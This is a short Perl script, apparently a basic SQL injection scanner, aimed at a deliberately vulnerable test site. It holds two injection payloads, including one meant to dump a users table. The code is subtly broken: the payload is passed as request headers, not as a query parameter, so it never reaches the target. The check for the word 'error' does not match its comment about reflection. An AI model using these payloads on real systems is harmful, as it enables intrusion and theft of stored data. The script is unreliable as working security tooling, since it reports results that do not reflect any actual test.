
##
##

use strict;
use LWP::UserAgent;

# Set the target URL
my $url = "http://testphp.vulnweb.com/artists.php?artist=1";

# Set the list of payloads to test
my @payloads = (
    "' OR '1'='1",
    "'; SELECT * FROM users; --"
);

# Create a user agent object
my $ua = LWP::UserAgent->new;

# Test each payload
foreach my $payload (@payloads) {
    # Send the request with the payload
    my $response = $ua->get($url, { "param" => $payload });

    # Check if the payload was reflected in the response
    if ($response->content =~ /error/i) {
        print " [+] SQL Injection Vulnerability Found!\n";
    } else {
        print " [-] No SQL Injection Vulnerability Found.\n";
    }
}
